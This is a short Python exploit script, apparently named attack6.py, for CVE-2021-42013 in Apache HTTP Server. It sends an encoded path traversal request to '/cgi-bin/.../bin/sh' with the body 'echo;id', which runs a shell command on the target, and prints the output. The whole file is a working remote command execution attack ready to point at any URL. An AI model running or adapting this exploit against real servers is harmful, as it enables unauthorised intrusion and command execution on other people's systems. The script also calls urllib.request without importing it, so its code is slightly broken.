#!/usr/bin/python
# based on https://github.com/walnutsecurity/cve-2021-42013
import os
import sys
import requests
import argparse
import urllib
from os import path

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"

usage = "attack6.py -u http://ip_address"

parser = argparse.ArgumentParser(usage=usage)
parser.add_argument("-u", dest="url", type=str, help="Specify IP to scan for CVE-2021-42013.")
args = parser.parse_args()


if args.url:
    url = args.url
	
    payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
    payload = url + urllib.parse.quote(payload, safe="/%")
    data = "echo;id"
    data = data.encode("ascii")

    try:
        request = urllib.request.Request(payload, data=data, headers={"User-Agent": user_agent})
        response = urllib.request.urlopen(request)
        res = response.read().decode("utf-8")
        print(res)
    except urllib.error.HTTPError:
        print ("[!] "+url+" failed")